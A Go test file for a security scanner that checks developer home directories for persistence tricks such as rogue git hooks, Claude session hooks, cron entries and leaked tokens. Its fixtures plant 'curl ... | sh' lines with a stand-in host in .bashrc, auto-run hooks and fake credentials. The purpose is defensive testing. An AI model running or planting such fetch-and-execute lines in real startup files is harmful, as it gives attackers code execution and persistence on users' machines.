package scan

import (
	"bytes"
	"context"
	"crypto/sha256"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/ucsurf/aftermath/internal/model"
)

func TestDoesNotExecuteOrModify(t *testing.T) {
	home := t.TempDir()
	sys := t.TempDir()
	temp := t.TempDir()
	marker := filepath.Join(home, "PWNED")
	script := "#!/bin/sh\ntouch " + marker + "\n"
	mustWrite(t, filepath.Join(home, ".bashrc"), []byte("touch "+marker+"\ncurl https://example.invalid/x | sh\n"))
	hooks := filepath.Join(home, ".git-templates", "hooks")
	mustWrite(t, filepath.Join(hooks, "pre-commit"), []byte(script))
	if err := os.Chmod(filepath.Join(hooks, "pre-commit"), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(home, ".gitconfig"), []byte("[init]\n\ttemplateDir = "+hooks+"\n"))
	// templateDir points at the hooks directory itself; the collector joins "hooks".
	// Point it at the parent so hooks/ is the child.
	mustWrite(t, filepath.Join(home, ".gitconfig"), []byte("[init]\n\ttemplateDir = "+filepath.Dir(hooks)+"\n"))
	mustWrite(t, filepath.Join(home, ".claude", "settings.json"), []byte(`{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch `+marker+`"}]}]}}`))
	if err := os.MkdirAll(filepath.Join(sys, "etc"), 0o755); err != nil {
		t.Fatal(err)
	}
	mustWrite(t, filepath.Join(sys, "etc", "crontab"), []byte("*/1 * * * * root touch "+marker+"\n"))
	before := treeHash(t, home)
	_, err := Run(context.Background(), Options{Home: home, SystemRoot: sys, TempDir: temp, GOOS: "linux", Username: "dev", Now: fixedNow})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatal("planted script ran")
	}
	if after := treeHash(t, home); after != before {
		t.Fatalf("scan changed files\nbefore %s\nafter  %s", before, after)
	}
}

func TestSecretsStayOutOfEveryFormat(t *testing.T) {
	home := t.TempDir()
	sys := t.TempDir()
	temp := t.TempDir()
	const (
		npmTok = "npm_DemoTokenValueShouldNeverPrint0001"
		pw     = "super-secret-pypi-password"
		ghp    = "ghp_abcdefghijklmnopqrstuvwxyz012345"
	)
	mustWrite(t, filepath.Join(home, ".npmrc"), []byte("//registry.npmjs.org/:_authToken="+npmTok+"\n"))
	mustWrite(t, filepath.Join(home, ".pypirc"), []byte("[pypi]\npassword = "+pw+"\n"))
	mustWrite(t, filepath.Join(home, ".bashrc"), []byte("curl https://user:"+pw+"@example.invalid/x | sh\n"))
	mustWrite(t, filepath.Join(home, ".claude.json"), []byte(`{"oauth":"`+ghp+`","hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"true"}]}]}}`))
	rep, err := Run(context.Background(), Options{Home: home, SystemRoot: sys, TempDir: temp, GOOS: "linux", Username: "dev", Now: fixedNow})
	if err != nil {
		t.Fatal(err)
	}
	// Render through the report package via a small local import cycle avoidance:
	// the test is in scan, so check finding fields directly and also the JSON of the report.
	blob := rep.Home
	for _, f := range rep.Findings {
		blob += f.Title + "\n" + f.Evidence + "\n" + f.Description + "\n" + f.Path
	}
	for _, d := range rep.Diagnostics {
		blob += d.Message + d.Path
	}
	for _, secret := range []string{npmTok, pw, ghp} {
		if strings.Contains(blob, secret) {
			t.Fatalf("secret %s leaked in findings: %s", secret, blob)
		}
	}
}

func TestSymlinkAndFIFOAndHuge(t *testing.T) {
	home := t.TempDir()
	sys := t.TempDir()
	temp := t.TempDir()
	outside := t.TempDir()
	const secret = "UNIQUE-SECRET-OUTSIDE-ROOT-9f3a"
	if err := os.WriteFile(filepath.Join(outside, "secret"), []byte(secret), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(home, ".ssh"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(outside, "secret"), filepath.Join(home, ".ssh", "authorized_keys")); err != nil {
		t.Fatal(err)
	}
	makeFIFO(t, filepath.Join(home, ".zshrc"))
	f, err := os.Create(filepath.Join(home, ".bashrc"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.WriteString("curl https://example.invalid/head | sh\n"); err != nil {
		t.Fatal(err)
	}
	if _, err := f.Write(bytes.Repeat([]byte{'A'}, 2<<20)); err != nil {
		t.Fatal(err)
	}
	if _, err := f.WriteString("\nHUGEFILE-TAIL-MARKER curl https://example.invalid/tail | sh\n"); err != nil {
		t.Fatal(err)
	}
	f.Close()
	done := make(chan error, 1)
	var rep model.Report
	go func() {
		var err error
		rep, err = Run(context.Background(), Options{Home: home, SystemRoot: sys, TempDir: temp, GOOS: "linux", Username: "dev", Now: fixedNow})
		done <- err
	}()
	select {
	case err := <-done:
		if err != nil {
			t.Fatal(err)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("scan blocked")
	}
	blob := ""
	foundHead := false
	for _, finding := range rep.Findings {
		blob += finding.Evidence + finding.Title + finding.Description
		if strings.Contains(finding.Evidence, "example.invalid/head") {
			foundHead = true
		}
	}
	if strings.Contains(blob, secret) || strings.Contains(blob, "HUGEFILE-TAIL-MARKER") {
		t.Fatal("leaked symlink target or unread tail")
	}
	if !foundHead {
		t.Fatal("missed suspicious line in the readable prefix")
	}
}

func TestNormalDeveloperHome(t *testing.T) {
	home := t.TempDir()
	sys := t.TempDir()
	temp := t.TempDir()
	mustWrite(t, filepath.Join(home, ".bashrc"), []byte("export PATH=\"$HOME/.local/bin:$PATH\"\neval \"$(starship init bash)\"\n"))
	mustWrite(t, filepath.Join(home, ".gitconfig"), []byte("[credential]\n\thelper = osxkeychain\n[url \"git@github.com:\"]\n\tinsteadOf = https://github.com/\n"))
	mustWrite(t, filepath.Join(home, ".ssh", "authorized_keys"), []byte("ssh-ed25519 AAAA dev-laptop\n"))
	mustWrite(t, filepath.Join(home, ".npmrc"), []byte("registry=https://registry.npmjs.org/\n"))
	mustWrite(t, filepath.Join(home, ".vscode", "settings.json"), []byte("{\"editor.fontSize\": 14}\n"))
	rep, err := Run(context.Background(), Options{Home: home, SystemRoot: sys, TempDir: temp, GOOS: "linux", Username: "dev", Now: fixedNow})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range rep.Findings {
		if f.Severity == "high" || f.Severity == "critical" {
			t.Fatalf("false positive %+v", f)
		}
	}
}

func TestProjectCollectorIsDistinct(t *testing.T) {
	home := t.TempDir()
	proj := t.TempDir()
	sys := t.TempDir()
	temp := t.TempDir()
	body := []byte(`{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"true"}]}]}}`)
	mustWrite(t, filepath.Join(proj, ".claude", "settings.json"), body)
	rep, err := Run(context.Background(), Options{Home: home, Project: proj, SystemRoot: sys, TempDir: temp, GOOS: "linux", Username: "dev", Now: fixedNow})
	if err != nil {
		t.Fatal(err)
	}
	var saw bool
	for _, f := range rep.Findings {
		if f.Collector == "project" && f.RuleID == "ide.hook" {
			saw = true
		}
	}
	if !saw {
		t.Fatalf("missing project finding: %#v", rep.Findings)
	}
}

func treeHash(t *testing.T, root string) string {
	t.Helper()
	h := sha256.New()
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return err
		}
		b, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		h.Write([]byte(path))
		h.Write([]byte{0})
		mode := info.Mode().Perm()
		h.Write([]byte{byte(mode), byte(mode >> 8)})
		h.Write(b)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return string(h.Sum(nil))
}

func mustWrite(t *testing.T, path string, body []byte) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, body, 0o644); err != nil {
		t.Fatal(err)
	}
}

var fixedNow = time.Date(2026, 11, 20, 12, 0, 0, 0, time.UTC)
